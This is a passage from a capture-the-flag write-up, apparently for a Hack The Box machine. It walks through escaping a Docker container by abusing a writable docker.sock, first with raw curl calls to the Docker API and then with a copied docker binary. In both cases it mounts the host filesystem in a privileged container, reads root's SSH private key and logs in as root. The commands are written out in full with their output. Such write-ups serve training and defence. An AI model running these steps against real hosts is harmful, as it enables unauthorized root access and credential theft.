        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 429664  bytes 283998882 (270.8 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 429664  bytes 283998882 (270.8 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

```

There’s all sorts of docker-related file names:

```

application@4dae106254bf:/$ ls
app   dev            entrypoint      etc   lib64  opt   run   sys  var
bin   docker.stderr  entrypoint.cmd  home  media  proc  sbin  tmp
boot  docker.stdout  entrypoint.d    lib   mnt    root  srv   usr

```

#### docker.sock

There’s a Docker socket file in `/app`:

```

application@4dae106254bf:/$ ls -la app/
total 8
drwxr-xr-x 1 application application 4096 Jun 24 15:56 .
drwxr-xr-x 1 root        root        4096 Jun 24 16:01 ..
srw-rw---- 1 root        app            0 Jun 24 16:00 docker.sock

```

Looking closely, it’s in the `app` group, which application has:

```

application@4dae106254bf:/$ id
uid=1000(application) gid=1000(application) groups=1000(application),999(app)

```

#### deepce

[deepce](https://github.com/stealthcopter/deepce) is a project for the enumeration and exploitation of Docker containers. It’s a shell script, so I’ll download a copy to my VM, and then upload a copy to the container.

Running it shows a bunch of enumeration information:

```

application@4dae106254bf:/tmp$ bash deepce.sh

                      ##         .
                ## ## ##        ==
             ## ## ## ##       ===                 
         /"""""""""""""""""\___/ ===
    ~~~ {~~ ~~~~ ~~~ ~~~~ ~~~ ~ /  ===- ~~~
         \______ X           __/
           \    \         __/    
            \____\_______/
          __
     ____/ /__  ___  ____  ________
    / __  / _ \/ _ \/ __ \/ ___/ _ \   ENUMERATE
   / /_/ /  __/  __/ /_/ / (__/  __/  ESCALATE
   \__,_/\___/\___/ .___/\___/\___/  ESCAPE
                 /_/

 Docker Enumeration, Escalation of Privileges and Container Escapes (DEEPCE)
 by stealthcopter
...[snip]...

```

Specifically this part is calling out the mounted docker socket:

[![image-20220624153722136](https://0xdfimages.gitlab.io/img/image-20220624153722136.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220624153722136.png)

### Host FileSystem Access

#### Background

The `docker.sock` file is what a program like `docker` uses to communicate with the docker daemon. Having read/write access to it is like being in the `docker` group, giving full control over Docker elements.

I showed exploiting this before in [Feline](/2021/02/20/htb-feline.html#shell-as-root).

#### Manually

The manual way to communicate with the `docker.sock` file is with `curl`. [This post](https://dejandayoff.com/the-danger-of-exposing-docker.sock/) gives a really nice walk through of how to exploit it.

First I’ll get a list of available images:

```

application@4dae106254bf:/app$ curl --unix-socket docker.sock http://localhost/images/json -s  
[{"Containers":-1,"Created":1656086146,"Id":"sha256:b97d15b16a2172a201a80266877a65a44b0d7fa31c29531c20cdcc8e98c2d227","Labels":{"io.webdevops.layout":"8","io.webdevops.version":"1.5.0","maintainer":"info@webdevops.io","vendor":"WebDevOps.io"},"ParentId":"sha256:762bfd88e0120a1018e9a4ccbe56d654c27418c7183ff4a817346fd2ac8b69af","RepoDigests":null,"RepoTags":["laravel-app_main:latest"],"SharedSize":-1,"Size":1975239137,"VirtualSize":1975239137},{"Containers":-1,"Created":1656085747,"Id":"sha256:e9caaedf4da091fcfb169a548258e8b573e4dd2d573bb863cccff3739fd82b14","Labels":{"io.webdevops.layout":"8","io.webdevops.version":"1.5.0","maintainer":"info@webdevops.io","vendor":"WebDevOps.io"},"ParentId":"sha256:a3d3e19fd90cb8a910337c2602b7a5438077a89784849259b725733a645187ac","RepoDigests":["<none>@<none>"],"RepoTags":["<none>:<none>"],"SharedSize":-1,"Size":1975239299,"VirtualSize":1975239299},{"Containers":-1,"Created":1656085185,"Id":"sha256:92a868f135fda20bfaaca8966d044eb49f38b5a5d844dd45ac66ed3069e97dee","Labels":{"io.webdevops.layout":"8","io.webdevops.version":"1.5.0","maintainer":"info@webdevops.io","vendor":"WebDevOps.io"},"ParentId":"sha256:76241298292dc449ddc707450cce1b51bc8f847866ff74ba7be6b40bedbfbae6","RepoDigests":["<none>@<none>"],"RepoTags":["<none>:<none>"],"SharedSize":-1,"Size":1975239137,"VirtualSize":1975239137},{"Containers":-1,"Created":1656083476,"Id":"sha256:4682915d4ab6f7b7af839cf6e9797af6fe65b6a8069e016692aa4033a7ea85e7","Labels":{"io.webdevops.layout":"8","io.webdevops.version":"1.5.0","maintainer":"info@webdevops.io","vendor":"WebDevOps.io"},"ParentId":"sha256:636584cff93435d2f58a3373b816c4f7eb6e2fcea1ca2ed25be8ba05ebdb985d","RepoDigests":["<none>@<none>"],"RepoTags":["<none>:<none>"],"SharedSize":-1,"Size":1951681272,"VirtualSize":1951681272},{"Containers":-1,"Created":1655739177,"Id":"sha256:e454775913b85289b97a7de74b0b74ccb33e56a654409e76c4cc06255ce372f3","Labels":{"io.webdevops.layout":"8","io.webdevops.version":"1.5.0","maintainer":"info@webdevops.io","vendor":"WebDevOps.io"},"ParentId":"sha256:caedebb73d2075bc1756a7df50d96681b5f44a6723c0141a699b30a45f0b2b7f","RepoDigests":["<none>@<none>"],"RepoTags":["<none>:<none>"],"SharedSize":-1,"Size":1947118238,"VirtualSize":1947118238},{"Containers":-1,"Created":1655515586,"Id":"sha256:ca37554c31eb2513cf4b1295d854589124f8740368842be843d2b4324edd4b8e","Labels":{"io.webdevops.layout":"8","io.webdevops.version":"1.5.0","maintainer":"info@webdevops.io","vendor":"WebDevOps.io"},"ParentId":"","RepoDigests":null,"RepoTags":["webdevops/php-apache:7.4"],"SharedSize":-1,"Size":1028279761,"VirtualSize":1028279761},{"Containers":-1,"Created":1655148764,"Id":"sha256:9afaa4584ff1bbe71574a38cd55045f5b82b950b9584fe96e05c3bafe170fa9e","Labels":null,"ParentId":"sha256:a079fdde95cead3483ebecc257c32076149387c18b53ccdab8427354f122fbf2","RepoDigests":["<none>@<none>"],"RepoTags":["<none>:<none>"],"SharedSize":-1,"Size":443051885,"VirtualSize":443051885},{"Containers":-1,"Created":1641170222,"Id":"sha256:bf73103d4225b1d6822180330cefa4702301fb5af4ea98c8be9b1ca18f24088c","Labels":null,"ParentId":"sha256:b14c853d41993559101db6835e27bfd12ff43413522414376daf3070d94a48fb","RepoDigests":["<none>@<none>"],"RepoTags":["<none>:<none>"],"SharedSize":-1,"Size":442993245,"VirtualSize":442993245},{"Containers":-1,"Created":1640902141,"Id":"sha256:6af04a6ff8d579dc4fc49c3f3afcaef2b9f879a50d8b8a996db2ebe88b3983ce","Labels":{"maintainer":"Thomas Bruederli <thomas@roundcube.net>"},"ParentId":"","RepoDigests":["roundcube/roundcubemail@sha256:f5b054716e2fdf06f4c5dbee70bc6e056b831ca94508ba0fc1fcedc8c00c5194"],"RepoTags":["roundcube/roundcubemail:latest"],"SharedSize":-1,"Size":612284073,"VirtualSize":612284073},{"Containers":-1,"Created":1640805761,"Id":"sha256:c99e357e6daee694f9f431fcc905b130f7a246d8c172841820042983ff8df705","Labels":null,"ParentId":"","RepoDigests":["composer@sha256:5e0407cda029cea056de126ea1199f351489e5835ea092cf2edd1d23ca183656"],"RepoTags":["composer:latest"],"SharedSize":-1,"Size":193476514,"VirtualSize":193476514},{"Containers":-1,"Created":1640297121,"Id":"sha256:cec4e9432becb39dfc2b911686d8d673b8255fdee4a501fbc1bda87473fb479d","Labels":{"org.opencontainers.image.authors":"The Docker Mailserver Organization on GitHub","org.opencontainers.image.description":"A fullstack but simple mail server (SMTP, IMAP, LDAP, Antispam, Antivirus, etc.). Only configuration files, no SQL database.","org.opencontainers.image.documentation":"https://github.com/docker-mailserver/docker-mailserver/blob/master/README.md","org.opencontainers.image.licenses":"MIT","org.opencontainers.image.revision":"061bae6cbfb21c91e4d2c4638d5900ec6bee2802","org.opencontainers.image.source":"https://github.com/docker-mailserver/docker-mailserver","org.opencontainers.image.title":"docker-mailserver","org.opencontainers.image.url":"https://github.com/docker-mailserver","org.opencontainers.image.vendor":"The Docker Mailserver Organization","org.opencontainers.image.version":"refs/tags/v10.4.0"},"ParentId":"","RepoDigests":["mailserver/docker-mailserver@sha256:80d4cff01d4109428c06b33ae8c8af89ebebc689f1fe8c5ed4987b803ee6fa35"],"RepoTags":["mailserver/docker-mailserver:latest"],"SharedSize":-1,"Size":560264926,"VirtualSize":560264926},{"Containers":-1,"Created":1640059378,"Id":"sha256:badd93b4fdf82c3fc9f2c6bc12c15da84b7635dc14543be0c1e79f98410f4060","Labels":{"maintainer":"maintainers@gitea.io","org.opencontainers.image.created":"2021-12-21T03:59:32Z","org.opencontainers.image.revision":"877040e6521e48c363cfe461746235dce4ab822b","org.opencontainers.image.source":"https://github.com/go-gitea/gitea.git","org.opencontainers.image.url":"https://github.com/go-gitea/gitea"},"ParentId":"","RepoDigests":["gitea/gitea@sha256:eafb7459a4a86a0b7da7bfde9ef0726fa0fb64657db3ba2ac590fec0eb4cdd0c"],"RepoTags":["gitea/gitea:1.15.8"],"SharedSize":-1,"Size":148275092,"VirtualSize":148275092},{"Containers":-1,"Created":1640055479,"Id":"sha256:dd3b2a5dcb48ff61113592ed5ddd762581be4387c7bc552375a2159422aa6bf5","Labels":null,"ParentId":"","RepoDigests":["mysql@sha256:20575ecebe6216036d25dab5903808211f1e9ba63dc7825ac20cb975e34cfcae"],"RepoTags":["mysql:5.6"],"SharedSize":-1,"Size":302527523,"VirtualSize":302527523},{"Containers":-1,"Created":1639694686,"Id":"sha256:0f7cb85ed8af5c33c1ca00367e4b1e4bfae6ec424f52bb04850af73fb19831d7","Labels":null,"ParentId":"","RepoDigests":["php@sha256:6eb4c063a055e144f4de1426b82526f60d393823cb017add32fb85d79f25b62b"],"RepoTags":["php:7.4-fpm-alpine"],"SharedSize":-1,"Size":82510913,"VirtualSize":82510913}]

```

That’s a lot of JSON, but in there are several image names. I’ll create a container from `laravel-app_main:latest`:

```

application@4dae106254bf:/app$ curl --unix-socket docker.sock -s -H 'Content-Type: application/json' -d '{"Hostname": "", "Domainname": "", "User": "", "AttachStdin": true, "AttachStdout": true, "AttachStderr": true, "Tty": true, "OpenStdin": true, "StdinOnce": true, "Entrypiont": "/bin/sh", "Image": "laravel-app_main:latest", "Volumes": {"/host/": {}}, "HostConfig": {"Binds": ["/:/host"]}}' http://localhost/containers/create
{"Id":"50260abcc7df2eb99a1c961c6b7522c1b612e802727847e09ec8be8c8c1c0585","Warnings":[]}

```

This container has the `/` of the host mapped into `/host` in the container. The command returns the ID of the container. Now I’ll start the container, using that ID in the URL:

```

application@4dae106254bf:/app$ curl --unix-socket docker.sock -s -X POST http://localhost/containers/50260abcc7df2eb99a1c961c6b7522c1b612e802727847e09ec8be8c8c1c0585/start

```

Now I’ll create an exec task:

```

application@4dae106254bf:/app$ curl --unix-socket docker.sock -s -H 'Content-Type: application/json' -d '{"AttachStdin": true, "AttachStdout": true, "AttachStderr": true, "Cmd": ["ls", "/host/"], "Privileged": true, "Tty": true }' http://localhost/containers/50260abcc7df2eb99a1c961c6b7522c1b612e802727847e09ec8be8c8c1c0585/exec
{"Id":"a5eb9844a911da620d697014900745ee2e21f4de9892e544ac59a432c2a0dc97"}

```

This task is running `ls /host/` (which is the root of the host file system). The command returns the `exec` ID.

I’ll run the exec:

```

application@4dae106254bf:/app$ curl --unix-socket docker.sock -s -H 'Content-Type: application/json' -d '{"Detach": false, "Tty": false}' http://localhost/exec/a5eb9844a911da620d697014900745ee2e21f4de9892e544ac59a432c2a0dc97/start -o-
bin    dev   initrd.img      lib64       mnt   root  snap  tmp  vmlinuz
boot   etc   initrd.img.old  lost+found  opt   run   srv   usr  vmlinuz.old
cdrom  home  lib             media       proc  sbin  sys   var

```

I can continue to run exec tasks, finding my way into `/root/.ssh`:

```

application@4dae106254bf:/app$ curl --unix-socket docker.sock -s -H 'Content-Type: application/json' -d '{"AttachStdin": true, "AttachStdout": true, "AttachStderr": true, "Cmd": ["ls", "/host/root/.ssh"], "Privileged": true, "Tty": true }' http://localhost/containers/50260abcc7df2eb99a1c961c6b7522c1b612e802727847e09ec8be8c8c1c0585/exec
{"Id":"73fb9820a3af0b3363a90d2aa915597024b449e8f08ad222389ed01d3ca2ec44"}
application@4dae106254bf:/app$ curl --unix-socket docker.sock -o- -H 'Content-Type: application/json' -d '{"Detach": false, "Tty": false}' http://localhost/exec/73fb9820a3af0b3363a90d2aa915597024b449e8f08ad222389ed01d3ca2ec44/start
%authorized_keys  id_rsa  id_rsa.pub

```

I’ll grab the key:

```

application@4dae106254bf:/app$ curl --unix-socket docker.sock -s -H 'Content-Type: application/json' -d '{"AttachStdin": true, "AttachStdout": true, "AttachStderr": true, "Cmd": ["cat", "/host/root/.ssh/id_rsa"], "Privileged": true, "Tty": true }' http://localhost/containers/50260abcc7df2eb99a1c961c6b7522c1b612e802727847e09ec8be8c8c1c0585/exec
{"Id":"8182368a53e3447e2c7a1aa72d4989a454f371c114583d6c59bc21074b5a5a2d"}
application@4dae106254bf:/app$ curl --unix-socket docker.sock -o- -H 'Content-Type: application/json' -d '{"Detach": false, "Tty": false}' http://localhost/exec/8182368a53e3447e2c7a1aa72d4989a454f371c114583d6c59bc21074b5a5a2d/start
a-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAxhCO2ZdFzdJj6zdL/L38ZGE7OzyRCnJ4qZJyz50X7Ux9JHWT
...[snip]...
QGGCfL85CcYSjPpqQp8ZOml4k/SaSzDUhb06PCuFi+i4afyuQyHAzw==
-----END RSA PRIVATE KEY-----

```

#### docker

To avoid all those awkward `curl` commands, I can also just bring a copy of the `docker` binary. There’s lots of places I could find this, including on Extension:

```

charlie@extension:~$ which docker                  
/usr/bin/docker

```

I’ll quickly start a Python web server on Extension in the `/usr/bin` directory, and download `docker` to the container:

```

application@4dae106254bf:/app$ wget 172.19.0.1:9999/docker -O /tmp/docker      
--2022-06-24 19:10:13--  http://172.19.0.1:9999/docker
Connecting to 172.19.0.1:9999... connected.
HTTP request sent, awaiting response... 200 OK
Length: 60522256 (58M) [application/octet-stream]
Saving to: ‘/tmp/docker’                     
/tmp/docker                                         100%[=====================================>]  57.72M   348MB/s    in 0.2s
2022-06-24 19:10:14 (348 MB/s) - ‘/tmp/docker’ saved [60522256/60522256] 

```

To run it, I’ll need to give the `docker.sock` location with `-H`:

```

application@4dae106254bf:/app$ /tmp/docker -H unix:///app/docker.sock ps
CONTAINER ID   IMAGE                                 COMMAND                  CREATED       STATUS       PORTS                                                                                                                               NAMES
4dae106254bf   laravel-app_main                      "/entrypoint supervi…"   3 hours ago   Up 3 hours   443/tcp, 0.0.0.0:9000->9000/tcp, :::9000->9000/tcp, 127.0.0.1:8001->80/tcp                                                          app
2ee49381d443   mysql:5.6                             "docker-entrypoint.s…"   3 hours ago   Up 3 hours   127.0.0.1:3306->3306/tcp                                                                                                            laravel-app_db_1
2a61ea345445   gitea/gitea:1.15.8                    "/usr/bin/entrypoint…"   10 days ago   Up 3 hours   22/tcp, 127.0.0.1:3000->3000/tcp                                                                                                    gitea
a8d993b7ef40   roundcube/roundcubemail               "/docker-entrypoint.…"   10 days ago   Up 3 hours   127.0.0.1:8000->80/tcp                                                                                                              roundcube
793abf612b3c   mailserver/docker-mailserver:latest   "/usr/bin/dumb-init …"   10 days ago   Up 3 hours   127.0.0.1:25->25/tcp, 110/tcp, 127.0.0.1:143->143/tcp, 127.0.0.1:587->587/tcp, 465/tcp, 995/tcp, 127.0.0.1:993->993/tcp, 4190/tcp   mailserver

```

I can start a new container:

```

application@4dae106254bf:/app$ /tmp/docker -H unix:///app/docker.sock run --name 0xdf -it --privileged -v /:/host/ -d --rm laravel-app_main
67f568fc7291aff979bd478c075a1f8d0e723c9021087679b73b069bf5c893d2

```

I’ll drop into that container with `exec`:

```

application@4dae106254bf:/app$ /tmp/docker -H unix:///app/docker.sock exec -it 0xdf bash
root@67f568fc7291:/var/www/html#

```

The host filesystem is there:

```

root@67f568fc7291:/host# ls
bin  boot  cdrom  dev  etc  home  initrd.img  initrd.img.old  lib  lib64  lost+found  media  mnt  opt  proc  root  run  sbin  snap  srv  sys  tmp  usr  var  vmlinuz  vmlinuz.old

```

As are the SSH keys:

```

root@67f568fc7291:/host/root/.ssh# ls
authorized_keys  id_rsa  id_rsa.pub

```

When I’m done with the container, I’ll stop it:

```

application@4dae106254bf:/app$ /tmp/docker -H unix:///app/docker.sock stop 0xdf
0xdf

```

Because I started it with `--rm`, it will be deleted when it stops.

### SSH

With the root key, I can easily get a shell:

```

oxdf@hacky$ ssh -i ~/keys/extension-root root@snippet.htb
root@extension:~#

```

And `root.txt`:

```

root@extension:~# cat root.txt
d7247702************************

```